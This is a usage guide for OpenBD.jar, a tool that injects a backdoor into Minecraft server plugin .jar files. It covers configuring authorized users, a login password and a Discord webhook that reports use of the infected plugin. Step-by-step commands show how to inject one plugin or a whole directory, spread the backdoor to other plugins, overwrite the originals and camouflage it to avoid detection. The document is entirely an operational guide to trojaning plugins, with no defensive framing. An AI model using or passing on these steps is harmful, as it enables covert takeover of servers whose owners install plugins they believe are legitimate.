# OpenBD Usage Guide

To use `OpenBD.jar`, follow these steps:

### Step 1: Generate the Configuration File

First, you need to create a `config.json` file to customize the backdoor's behavior. Use the following command in your terminal or command prompt:

```sh
java -jar OpenBD.jar --generate-config config.json
```

This command will create a `config.json` file with default values.

### Step 2: Edit the Configuration File

Open the newly created `config.json` file and modify it to suit your needs.

#### Default Configuration:
```json
{
  "authorized_uuids": [],
  "authorized_usernames": [],
  "command_prefix": "!",
  "inject_into_other_plugins": false,
  "display_debug_messages": false,
  "discord_token": "",
  "password": ""
}
```

#### Option Descriptions:

| Option | Purpose |
| :--- | :--- |
| `authorized_uuids` | A list of player UUIDs that are authorized to use the backdoor. |
| `authorized_usernames` | A list of player names that are authorized to use the backdoor. |
| `command_prefix` | The prefix for backdoor commands (e.g., `!`). |
| `inject_into_other_plugins` | Automatically spread the backdoor to other plugins on the server. |
| `display_debug_messages` | Display debug messages in the console. |
| `discord_token` | A Discord webhook token to send information when someone uses your injected plugin. |
| `password` | The password required to log in to the backdoor using `!login [password]`. |

#### Example of a Modified Config File:
```json
{
  "authorized_uuids": ["069a79f4-44e9-4726-a5be-fca90e38aaf5"],
  "authorized_usernames": ["Kudo","kudo"],
  "command_prefix": "!",
  "inject_into_other_plugins": true,
  "display_debug_messages": false,
  "discord_token": "YOUR_DISCORD_WEBHOOK_TOKEN_HERE",
  "password": "12345"
}
```

#### Helpful Tips:
*   If both `authorized_uuids` and `authorized_usernames` are left empty, everyone on the server will see the backdoor login message but cannot use it without the password.
*   If `password` is not set, you can log in with just the `!login` command.
*   To remain discreet, keep `display_debug_messages` set to `false`.

### Step 3: Inject the Backdoor into a Plugin

Once you have configured `config.json`, you can inject the backdoor into one or more plugins.

#### General Syntax:
```sh
java -jar OpenBD.jar --inject [options]
```

#### Examples:

**1. Inject into a single plugin file:**

This command injects the backdoor into `plugin.jar` and creates a new file named `plugin-injected.jar`.

```sh
java -jar OpenBD.jar --inject -m single -i plugin.jar -o plugin-injected.jar -c config.json
```

**2. Inject and replace the original file:**

Use the `-r` (or `--replace`) flag to overwrite the original plugin file. **Use this option with caution.**

```sh
java -jar OpenBD.jar --inject -m single -i plugin.jar -c config.json -r
```

**3. Inject into multiple plugins in a directory:**

This command processes all `.jar` files in the `plugins-in` directory and saves the injected files to the `plugins-out` directory.

```sh
java -jar OpenBD.jar --inject -m multiple -i plugins-in/ -o plugins-out/ -c config.json
```

**4. Inject with camouflage:**

Add the `--camouflage` flag to make the backdoor harder to detect. This example also replaces the original file.

```sh
java -jar OpenBD.jar --inject -m single -i plugin.jar -c config.json --camouflage -r
```

---

## List of Commands and Flags

### Main Commands:

| Command | Description |
| :--- | :--- |
| **`--inject`** | The main operation, used to inject the backdoor into `.jar` files. |
| **`--generate-config <path>`** | Generates a default `config.json` file at the specified path. |
| **`--status <path>`** | Checks if a plugin has been injected (feature not yet complete). |
| **`--help`**, **`-h`** | Shows this help message. |

### Options for the `--inject` command:

| Option | Alias | Description |
| :--- | :--- | :--- |
| **`--config <path>`** | `-c` | Path to the `config.json` configuration file. |
| **`--mode <mode>`** | `-m` | Processing mode: `single` (one file) or `multiple` (default, for directories). |
| **`--input <path>`** | `-i` | Input path. A file for `single` mode (default: `in.jar`), or a directory for `multiple` mode (default: `in`). |
| **`--output <path>`** | `-o` | Output path. A file for `single` mode (default: `out.jar`), or a directory for `multiple` mode (default: `out`). |
| **`--replace`** | `-r` | Replaces the input file(s) instead of creating new ones in the output path. |
| **`--camouflage`** | | Camouflages the backdoor to avoid detection. |
| **`--trace-errors`** | `-tr` | Displays the full stack trace on errors. |